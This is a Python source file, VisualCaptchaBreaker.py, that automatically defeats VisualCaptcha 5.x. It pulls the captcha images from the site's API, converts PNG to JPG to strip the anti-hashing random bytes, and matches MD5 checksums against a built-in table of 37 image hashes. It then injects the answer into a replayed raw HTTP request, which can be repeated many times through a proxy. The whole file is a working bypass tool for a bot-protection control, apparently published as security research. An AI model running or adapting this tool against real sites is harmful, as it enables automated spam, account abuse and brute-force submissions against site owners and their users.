'''
 __      ___                 _  _____            _       _
 \ \    / (_)               | |/ ____|          | |     | |
  \ \  / / _ ___ _   _  __ _| | |     __ _ _ __ | |_ ___| |__   __ _
   \ \/ / | / __| | | |/ _` | | |    / _` | '_ \| __/ __| '_ \ / _` |
    \  /  | \__ \ |_| | (_| | | |___| (_| | |_) | || (__| | | | (_| |
     \/   |_|___/\__,_|\__,_|_|\_____\__,_| .__/ \__\___|_| |_|\__,_|
               |  _ \               | |   | |
               | |_) |_ __ ___  __ _| | __|_| _ __
               |  _ <| '__/ _ \/ _` | |/ / _ \ '__|
               | |_) | | |  __/ (_| |   <  __/ |
               |____/|_|  \___|\__,_|_|\_\___|_|

Title:                  VisualCaptchaBreaker.py
Author:                 Yann CAM
Website:                www.asafety.fr
Source:                 github.com/yanncam/VisualCaptchaBreaker
Description:            Breaking any VisualCaptcha 5.x with 100% success rate
Greetz:					St0rn (0xbadcoded.com), nj8 (www.information-security.fr) and Emiya (www.georgestaupin.com)

- 	VisualCaptchaBreaker can be used against any VisualCaptcha 5.* web page (with API call /start and /image).
	(@see visualcaptcha.net / github.com/emotionLoop/visualCaptcha)
- 	In the VisualCaptcha branch 5.*, a new protection mecanism was introduced with adding random bytes to each PNG. 
	VisualCaptchaBreaker convert these PNG to JPG to bypass this security.
	(@see github.com/emotionLoop/visualCaptcha/issues/2)
-	You need to update the dictionary dicoImg with your JPG/PNG pictures checksum and text-label for your language (if customized)
	Default dictionaries provided are based on the default VisualCaptcha's image database in english and french.
-	Tested successfully against VisualCaptcha demo page (demo.visualcaptcha.net), custom VisualCaptcha PoC with simple POST data and multipart/form-data.
- 	Raw http request file process inspired from grimhacker.com/2015/04/07/raw-http-requests-to-burp-proxy/

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
'''

__version__ = "Version: 1.0.0"

import os
import sys
import argparse
import logging
from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO
import requests
import json
import random
import string
import hashlib
from PIL import Image
import cStringIO

# For newer version of VisualCaptcha 5.x, picture database with 0-50 random bytes added need to be converted from PNG to JPG for right checksum value, so there are JPG and PNG checksum in the next dict.
# Dictionary of key:value with :
#   labelEN		= textual solution of the captcha in english (you may change these label for your language)
#   labelFR 	= textual solution of the captcha in french (you may change these label for your language)
#	md5SumPng	= checkSum of the original picture in PNG
#	md5SumJpg	= checkSum of the picture converted from PNG to JPG (to remove random bytes added by VisualCaptcha)
dicoImg = {}
dicoImg[0] 	= {"labelEN":u"Airplane", 			"labelFR":u"l'avion", 					"md5SumPng":"6244aa85ad7e02e7a46544d5deab0225", "md5SumJpg":"c4fe178b16c681fef26860d36410aff4"}
dicoImg[1] 	= {"labelEN":u"Balloons", 			"labelFR":u"le ballon", 				"md5SumPng":"4c3fbd0824a5f2f3c58069c0416755e7", "md5SumJpg":"c17b70628392f6d696cc1b25f5fb386f"}
dicoImg[2] 	= {"labelEN":u"Camera", 			"labelFR":u"la camera", 				"md5SumPng":"00ab6b7f0972d5b5d2bef888ab198929", "md5SumJpg":"fcf9b5602694bfd0e3a97036a700affc"}
dicoImg[3] 	= {"labelEN":u"Car", 				"labelFR":u"la voiture", 				"md5SumPng":"281398645bee48e8c78cf8f650dc830e", "md5SumJpg":"2a6a41f2f3b204c917fd03ee5a74cc2c"}
dicoImg[4] 	= {"labelEN":u"Cat", 				"labelFR":u"le chat", 					"md5SumPng":"e3f67527bdff4b14a8297bb61e6b3c6a", "md5SumJpg":"89b833eb55b97c717d9b0d9d12788233"}
dicoImg[5] 	= {"labelEN":u"Chair", 				"labelFR":u"la chaise", 				"md5SumPng":"6a385164d1f36e6c2e137c1fc11569bc", "md5SumJpg":"456780afb08cdaf562af8d89497bc875"}
dicoImg[6] 	= {"labelEN":u"Clip", 				"labelFR":u"le trombone", 				"md5SumPng":"99be7138303ce797139a56c78e1b0143", "md5SumJpg":"aa7e561ebc0fba06d30f5ecdb55c0841"}
dicoImg[7] 	= {"labelEN":u"Clock", 				"labelFR":u"l'horloge",			 		"md5SumPng":"4039b8c0aa05f2c35402da5842e2a37c", "md5SumJpg":"6612e4fabfb7219ed0662d3901a50b4a"}
dicoImg[8] 	= {"labelEN":u"Cloud", 				"labelFR":u"le nuage", 					"md5SumPng":"f25649f668fcc7ac37272ed5b6297087", "md5SumJpg":"76aea7d6235509a1ce3a04d168434eb8"}
dicoImg[9] 	= {"labelEN":u"Computer", 			"labelFR":u"l'ordinateur", 				"md5SumPng":"a4672d1d019615d061e40ee2c93ee625", "md5SumJpg":"943f4c78b35672d6fe2d8d7c7b16c2b2"}
dicoImg[10] = {"labelEN":u"Envelope", 			"labelFR":u"l'enveloppe", 				"md5SumPng":"8c0b138a901ef5fe947c097ee87f36d8", "md5SumJpg":"6b99e64fe2b18c6ec388b8080bcd9947"}
dicoImg[11] = {"labelEN":u"Eye", 				"labelFR":u"l'\u0153il", 				"md5SumPng":"4f015b25855c27fffb3a1c74fab21e49", "md5SumJpg":"ecad2ea49116b86c4eea21f0cd076e62"}
dicoImg[12] = {"labelEN":u"Flag", 				"labelFR":u"le drapeau", 				"md5SumPng":"22d49079ad2488da20e4406673f84850", "md5SumJpg":"8edd4f6aba641a23545e242c4d00baf1"}
dicoImg[13] = {"labelEN":u"Folder", 			"labelFR":u"le dossier", 				"md5SumPng":"2967a3efaa81e4274a393ac255db7571", "md5SumJpg":"44561c957ab6ea338bafa9d7a52d9992"}
dicoImg[14] = {"labelEN":u"Foot", 				"labelFR":u"le pied", 					"md5SumPng":"c6cfa33642ad33a4e994b67cbf21fab9", "md5SumJpg":"72a676cfde643c841232c76f60989090"}
dicoImg[15] = {"labelEN":u"Graph", 				"labelFR":u"le graphique", 				"md5SumPng":"1150e3337212480303666930fb4f6129", "md5SumJpg":"0b80d90a8eae32c984481cfce01872f4"}
dicoImg[16] = {"labelEN":u"House", 				"labelFR":u"la maison", 				"md5SumPng":"7737c648fa8ee406c6358310f9c01933", "md5SumJpg":"351eb8558342cdab5bd37c9aa5ed7ee0"}
dicoImg[17] = {"labelEN":u"Key", 				"labelFR":u"la cl\xe9", 				"md5SumPng":"408df11947910cfdc982b2b92577bd16", "md5SumJpg":"139da71c5ac0954f668ff1947e73245f"}
dicoImg[18] = {"labelEN":u"Leaf", 				"labelFR":u"la feuille",				"md5SumPng":"aedaf372ae1a4f8926d5eaf714ef964e", "md5SumJpg":"9c4a256697476081b8eb34a05501ef2e"}
dicoImg[19] = {"labelEN":u"Light Bulb", 		"labelFR":u"l'ampoule", 				"md5SumPng":"13019b196a9b4d683b9be5171c30228e", "md5SumJpg":"39092d7718747b6f0b01cb7282d136bc"}
dicoImg[20] = {"labelEN":u"Lock", 				"labelFR":u"le cadenas", 				"md5SumPng":"f163cfd73e7ae3d6b74628d462031571", "md5SumJpg":"433cdaaf1e0ca0d8367727f7e7497c12"}
dicoImg[21] = {"labelEN":u"Magnifying Glass", 	"labelFR":u"la loupe", 					"md5SumPng":"60e45aa0fc7568c91e407040bb25bab5", "md5SumJpg":"eaa28a149864637c6d3bb7c58cdae136"}
dicoImg[22] = {"labelEN":u"Man", 				"labelFR":u"l'homme", 					"md5SumPng":"8cc02a562dc900e170359e39265bc1a0", "md5SumJpg":"1d42c40b62bf899b25f1cddade543658"}
dicoImg[23] = {"labelEN":u"Music Note", 		"labelFR":u"la note de musique", 		"md5SumPng":"11a40b95e60b6fd5cdb71700f5ecda40", "md5SumJpg":"63c155f036c3a013362c527a055e258b"}
dicoImg[24] = {"labelEN":u"Pants", 				"labelFR":u"le pantalon", 				"md5SumPng":"c19ab39cbb9c975e4ffdfbef49463ce6", "md5SumJpg":"0985b57fb6a40d3142534f5e2c59d7f4"}
dicoImg[25] = {"labelEN":u"Pencil", 			"labelFR":u"le crayon", 				"md5SumPng":"da973c89a2dde823db27651af6a9a8c2", "md5SumJpg":"b7ca3af8c38fa6e4f9a0cb5ed89bc493"}
dicoImg[26] = {"labelEN":u"Printer", 			"labelFR":u"l'imprimante", 				"md5SumPng":"fbee80e758f9c3f97f0937ae57376a25", "md5SumJpg":"4b6b62f3be8168abba5ad105eb086fb9"}
dicoImg[27] = {"labelEN":u"Robot", 				"labelFR":u"le robot", 					"md5SumPng":"a21f269412e9e0010ca9d445e5c83c8e", "md5SumJpg":"872af7339e75f6cae2313eb28aac9c44"}
dicoImg[28] = {"labelEN":u"Scissors", 			"labelFR":u"les ciseaux", 				"md5SumPng":"7677bf11f61d0468a346665da8d32049", "md5SumJpg":"86666417338139368ca43a8963ebced2"}
dicoImg[29] = {"labelEN":u"Sunglasses", 		"labelFR":u"les lunettes de soleil", 	"md5SumPng":"9894af350cd2762f9b8dafc0d77ff94f", "md5SumJpg":"93d5e02b511f42936c5d4873f6b064ea"}
dicoImg[30] = {"labelEN":u"Tag", 				"labelFR":u"l'etiquette", 				"md5SumPng":"445a64861cf1e42005186239654e7901", "md5SumJpg":"35b1b173e847b202eedac99db3002da9"}
dicoImg[31] = {"labelEN":u"Tree", 				"labelFR":u"l'arbre", 					"md5SumPng":"6c48f44beb774bd266db86e2e05cfd03", "md5SumJpg":"446bf84f96960d03b4ed97ee4f60fc92"}
dicoImg[32] = {"labelEN":u"Truck", 				"labelFR":u"le camion", 				"md5SumPng":"7dab3bdda4e612f193290f1113400c51", "md5SumJpg":"f5f79595f81967f383fa289e3e682c23"}
dicoImg[33] = {"labelEN":u"T-Shirt", 			"labelFR":u"le t-shirt", 				"md5SumPng":"8cba2d4bb76178a76e0bfd49e001debc", "md5SumJpg":"17a86e0825bc56546efa762160af0d19"}
dicoImg[34] = {"labelEN":u"Umbrella", 			"labelFR":u"le parapluie", 				"md5SumPng":"bc350c35751c61f20139ef5fb6fb012a", "md5SumJpg":"287c4df92b339bdedf65cea6fc7977f9"}
dicoImg[35] = {"labelEN":u"Woman", 				"labelFR":u"la femme", 					"md5SumPng":"8b11faa3a78fd6ca13b3afb5a74e1a74", "md5SumJpg":"65b32b9748014155896de24c2ba4a408"}
dicoImg[36] = {"labelEN":u"World", 				"labelFR":u"la plan\xe8te", 			"md5SumPng":"f3c5ec4cb20fe279159a2c29cc5489f2", "md5SumJpg":"2739865da34888314752ee72ea97bf76"}

class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, rawRequest):
        self.rfile = StringIO(rawRequest)
        self.raw_requestline = self.rfile.readline()
        self.error_code = None
        self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
		
# Function processResults : display / print the final response of the server
# Customize this function to add specific treatment of the results (check a flag, get a status, etc.).
# - targetReq : response object of the server
def processResults(targetReq):
	logging.info("Result URL = {0} [{1}]".format(targetReq.request.url, targetReq.status_code))
	logging.debug("Result Headers = \n{0}".format(targetReq.headers))
	logging.debug("Result Response = \n{0}".format(targetReq.text))
	logging.info(bcolors.OKBLUE + "VisualCaptcha session terminated !\n"+bcolors.ENDC)

# Function initCaptcha : GET the /start API endpoint to retrieve VisualCaptcha JSON initialization
# - urlStart : the /start/1?r=XXXXXXXXXXXX URL for initialization
# - headers : headers cleaned from the raw request in file (with cookie or not)
# - proxy : dict with proxy configuration
def initCaptcha(urlStart, headers, proxy={}):
	logging.info(bcolors.OKBLUE + "Init VisualCaptcha: {0}".format(urlStart)+bcolors.ENDC)
	reqStart = session.get(urlStart, proxies=proxy, headers=headers)
	data = json.loads(reqStart.text)
	logging.debug("Initialization data {0}".format(reqStart.text))
	return data

# Function solveCaptcha : get all captcha's picture, convert it, calculate checksum, then resolve the captcha solution.
# - data : JSON initialization data retrieve from /start API call
# - urlImage : the /image/{i}?r=XXXXXXXXXXXX URL pattern for getting captcha's pictures
# - headers : headers cleaned from the raw request in file (with cookie or not)
# - proxy : dict with proxy configuration	
def solveCaptcha(data, urlImage, headers, proxy={}):
	hashImgsJpg = {}
	hashImgsPng = {}
	i = 0
	for value in data["values"]:
		# Get all images locaded for the current captcha's session
		logging.info("Retrieve VisualCaptcha image [{0}]: {1}".format(i, urlImage.format(i=i)))
		reqImg = session.get(urlImage.format(i=i), proxies=proxy, headers=headers)
		if reqImg.status_code == 200:
			# Save the current PNG picture in buffer
			imgPng = cStringIO.StringIO(reqImg.content)
			hashImgsPng[value] = hashlib.md5(imgPng.getvalue()).hexdigest()
			logging.debug("Calculating checksum for PNG-original image [{0}] (value : {1}): [{2}]".format(i, value, hashImgsPng[value]))
			imgPng = Image.open(imgPng)
			# Convert the current PNG picture buffer to JPG buffer to clean noise and random bytes added on latest VisualCaptcha version
			imgJpg = cStringIO.StringIO()
			# Convert RGBA to RGB (deletion of alpha-channel) before JPEG convertion
			imgPng = imgPng.convert("RGB")
			imgPng.save(imgJpg, "JPEG")
			# Calculate checksum of the JPG picture buffer version (because checkSum of PNG are not safe with random bytes added to picture by visualCaptcha)
			hashImgsJpg[value] = hashlib.md5(imgJpg.getvalue()).hexdigest()
			logging.debug("Calculating checksum for JPG-converted image [{0}] (value : {1}): [{2}]".format(i, value, hashImgsJpg[value]))
		i = i+1
	# Retrieve the right captcha solution from initial JSON data and checkSums dictionnary of JPG picture database (newer VisualCaptcha 5.x version)
	captchaSolution = ""
	for value in data["values"]:
		logging.debug(u"Compare JPG and PNG checksum for value '{0}' with dictionnary to find [{1}]".format(value, data["imageName"]))
		for entry in dicoImg:
			if (dicoImg[entry]["md5SumJpg"] == hashImgsJpg[value] and (data["imageName"] == dicoImg[entry]["labelEN"] or data["imageName"] == dicoImg[entry]["labelFR"])):
				captchaSolution = value
				logging.info(bcolors.OKGREEN + "VisualCaptcha solution broken: value [{0}] JPG-checksum [{1}] label [{2}]".format(captchaSolution, hashImgsJpg[captchaSolution], data["imageName"].encode("utf-8"))+bcolors.ENDC)
				break
			if (dicoImg[entry]["md5SumPng"] == hashImgsPng[value] and (data["imageName"] == dicoImg[entry]["labelEN"] or data["imageName"] == dicoImg[entry]["labelFR"])):
				captchaSolution = value
				logging.info(bcolors.OKGREEN + "VisualCaptcha solution broken: value [{0}] PNG-checksum [{1}] label [{2}]".format(captchaSolution, hashImgsPng[captchaSolution], data["imageName"].encode("utf-8"))+bcolors.ENDC)
				break
		if captchaSolution != "":
			break
	return captchaSolution

# Function makeRequest : function to process the input request after breaking captcha
# - rawRequest : the raw request as string from file
# - protocol : http or https
# - proxy : dict with proxy configuration		
# - startPath : the /start API endpoint path (if customized)
# - imagePath : the /image API endpoint path (if customized)
def makeRequest(rawRequest, protocol="http", proxy={}, startPath="/start", imagePath="/image"):
	randomstr = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
	try:
		# Parsing raw request into HTTPRequest object and clean original headers
		logging.debug("Parsing rawRequest")
		# Parse the raw request to an object.
		request = HTTPRequest(rawRequest)
		logging.debug("Prepare headers")
		# Replay headers of interest in each session's requests
		if not args.cookie:
			# Don't use the cookie vlue from raw HTTP request file
			logging.debug("Don't use cookie from raw http request.")
			request.headers = {"host":request.headers["host"], "user-agent":request.headers["user-agent"], "referer":request.headers["referer"], "content-type":request.headers["content-type"]}
		else:
			# Use the cookie vlue from raw HTTP request file
			logging.debug("Use cookie from raw http request.")
			request.headers = {"host":request.headers["host"], "user-agent":request.headers["user-agent"], "referer":request.headers["referer"], "content-type":request.headers["content-type"], "cookie":request.headers["cookie"]}
		logging.debug("Cleaned headers:\n{0}".format(request.headers))
	except Exception as e:
		raise Exception("Failed to parse raw request. {0}".format(e))

	try:
		# Extract the information we need from the request object:
		logging.debug("Extracting required information")
		host = request.headers.get('host')
		url = "{protocol}://{host}{path}".format(protocol=protocol, host=host, path=request.path)
	except Exception as e:
		raise Exception("Failed to extract fields from parsed request. {0}".format(e))
	
	try:
		# Initialize captcha with API endpoint /start
		urlStart = "{protocol}://{host}{path}".format(protocol=protocol, host=host, path=(startPath+"/1?r=" + randomstr))
		data = initCaptcha(urlStart, request.headers, proxy)
	except Exception as e:
		raise Exception("Failed to initialize VisualCaptcha with /start. {0}".format(e))
		
	try:
		# Process captcha's pictures with API endpoint /image
		urlImage = "{protocol}://{host}{path}".format(protocol=protocol, host=host, path=(imagePath+"/{i}?r=" + randomstr))
		captchaSolution = solveCaptcha(data, urlImage, request.headers, proxy)
	except Exception as e:
		raise Exception("Failed to retrieve VisualCaptcha's pictures with /image. {0}".format(e))
		
	try:
		# Replace %VISUALCAPTCHA*% tags in original request with broken value
		body = request.rfile.read()
		body = body.replace("%VISUALCAPTCHANAME%", data["imageFieldName"])
		body = body.replace("%VISUALCAPTCHAVALUE%", captchaSolution)
	except Exception as e:
		raise Exception("Failed to inject VisualCaptcha's broken value into parsed request. {0}".format(e))
		
	try:
		# Sent final request with VisualCaptcha's broken value
		logging.info("Sending final request to {0} with data :\n{1}".format(url, body))
		targetReq = session.post(url, headers=request.headers, data=body, proxies=proxy, allow_redirects=False)
		# Dirty patch to fix cookie missing with 302 redirect in Python requests session object (https://github.com/kennethreitz/requests/issues/1228)
		if targetReq.status_code == 302:
			if targetReq.headers["location"].startswith("/"):
				targetReq = session.get(protocol+"://"+host+targetReq.headers["location"], headers=request.headers, data=body, proxies=proxy, allow_redirects=False)
			else :
				targetReq = session.get(url.rsplit('/', 1)[0]+"/"+targetReq.headers["location"], headers=request.headers, data=body, proxies=proxy, allow_redirects=False)
		logging.info("Request successfully sent.")
		# Process data in response
		processResults(targetReq)
	except Exception as e:
		raise Exception("Failed to send request. {0}".format(e))

# Function main : main function to process raw request file(s) in loop
# - files : array of raw request file(s) to be processed
# - protocol : http or https
# - proxy : dict with proxy configuration
# - number : how many times the same request must be sent ?
# - startPath : the /start API endpoint path (if customized)
# - imagePath : the /image API endpoint path (if customized)
def main(files, protocol, proxy, number=1, startPath="/start", imagePath="/image"):
	failed = []
	try:
		for file_ in files:
			logging.info("Handling: {0}".format(file_))
			try:
				with open(file_, "r") as f:
					rawRequest = f.read()
					try:
						for i in range(0, number):
							makeRequest(rawRequest, protocol=protocol, proxy={'https':proxy, 'http':proxy}, startPath=startPath, imagePath=imagePath)
					except Exception as e:
						failed.append((file_, e))
						logging.warning(bcolors.WARNING+"Error handling: {0} - {1}".format(file_, e)+bcolors.ENDC)
			except Exception as e:
				failed.append((file_, e))
				logging.warning(bcolors.WARNING+"Error reading: {0} - {1}".format(file_, e)+bcolors.ENDC)
	except Exception as e:
		for file_ in files:
			failed.append((file_, e))
		logging.critical(bcolors.FAIL+"Error: {0}".format(e)+bcolors.ENDC)
	if failed:
		logging.warning(bcolors.WARNING+"The following requests were not successfully handled and may not be in your proxy:\n{0}".format("\n".join(str(file_) for file_, reason in failed))+bcolors.ENDC)

# Function printHeader :  print / display the header
def printHeader():
    print """
 __      ___                 _  _____            _       _           
 \ \    / (_)               | |/ ____|          | |     | |          
  \ \  / / _ ___ _   _  __ _| | |     __ _ _ __ | |_ ___| |__   __ _ 
   \ \/ / | / __| | | |/ _` | | |    / _` | '_ \| __/ __| '_ \ / _` |
    \  /  | \__ \ |_| | (_| | | |___| (_| | |_) | || (__| | | | (_| |
     \/   |_|___/\__,_|\__,_|_|\_____\__,_| .__/ \__\___|_| |_|\__,_|
               |  _ \               | |   | |                        
               | |_) |_ __ ___  __ _| | __|_| _ __                   
               |  _ <| '__/ _ \/ _` | |/ / _ \ '__|                  
               | |_) | | |  __/ (_| |   <  __/ |                     
               |____/|_|  \___|\__,_|_|\_\___|_|
			   
Title: 			VisualCaptchaBreaker.py  {0}
Author: 		Yann CAM
Website: 		www.asafety.fr
Source:			github.com/yanncam/VisualCaptchaBreaker
Description: 		Breaking any VisualCaptcha 5.x with 100% success rate
-----------------------------------------------------------------------------
""".format(__version__)

def printExample():
	print "coucou"

if __name__ == "__main__":
	printHeader()
	#parser = argparse.ArgumentParser(description="Breaking any VisualCaptcha with 100% success rate")
	parser = argparse.ArgumentParser(description="""Breaking any VisualCaptcha 5.x with 100% success rate :
	eg: python VisualCaptchaBreaker-latest.py -f TARGET_REQUEST.txt
	eg: python VisualCaptchaBreaker-latest.py -d TARGET_DIRECTORY
	eg: python VisualCaptchaBreaker-latest.py -f TARGET_REQUEST.txt -p "127.0.0.1:8080" -n 10
	eg: python VisualCaptchaBreaker-latest.py -f TARGET_REQUEST.txt -s "/visualCaptcha-PHP/public/start" -i "/visualCaptcha-PHP/public/image" -n 10 -c -v --https
	
TARGET_REQUEST.txt sample raw request file (to demo.visualcaptcha.net) :
	POST /try HTTP/1.1
	Host: demo.visualcaptcha.net
	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
	Referer: http://demo.visualcaptcha.net/
	Cookie: PHPSESSID=MyFaKeSeSsIoNiD
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 52

	%VISUALCAPTCHANAME%=%VISUALCAPTCHAVALUE%&submit-bt=""",  
                                       usage='%(prog)s [OPTIONS]', 
                                       formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument("-n", "--number", help="Number of request(s) to make (default: 1)", default="1")
	parser.add_argument("-s", "--startPath", help="VisualCaptcha initialization path (default: /start)", default="/start")
	parser.add_argument("-i", "--imagePath", help="VisualCaptcha image path (default: /image)", default="/image")
	parser.add_argument("-c", "--cookie", help="Use cookie defined in raw HTTP file(s)", action="store_true")
	parser.add_argument("-f", "--files", help="Files containing raw HTTP requests with %%VISUALCAPTCHANAME%% and %%VISUALCAPTCHAVALUE%% as POST param", nargs="+")
	parser.add_argument("-d", "--directory", help="Directory containing raw HTTP requests in files with %%VISUALCAPTCHANAME%% and %%VISUALCAPTCHAVALUE%% as POST param")
	parser.add_argument("-p", "--proxy", help="HTTP Proxy to send requests via. (Burp eg: 127.0.0.1:8080)", default="")
	parser.add_argument("--https", help="Use HTTPS", action="store_true")
	parser.add_argument("-v", "--verbose", help="Debug logging", action="store_true")
	args = parser.parse_args()

	if args.verbose:
		level = logging.DEBUG
	else:
		level = logging.INFO
	logging.basicConfig(level=level,
						format="%(levelname)s: %(message)s")
	logging.getLogger("requests").setLevel(logging.WARNING)

	if not (args.files or args.directory):
		logging.critical("Specify directory and/or files")
		parser.print_usage()
		exit()

	files = []
	if args.files:
		logging.debug("Getting file names from command line")
		files += args.files
	if args.directory:
		logging.debug("Getting file names from directory '{0}'".format(args.directory))
		try:
			for (dirpath, dirnames, filenames) in os.walk(args.directory):
				for filename in filenames:
					files.append(os.path.join(dirpath, filename))
				break
		except Exception as e:
			logging.critical(bcolors.FAIL+"Failed to get file names from directory '{0}'".format(args.directory)+bcolors.ENDC)
			exit()
	
	protocol = "http"
	if args.https:
		protocol = "https"
	
	session = requests.Session()
	main(files, protocol, args.proxy, int(args.number), args.startPath, args.imagePath)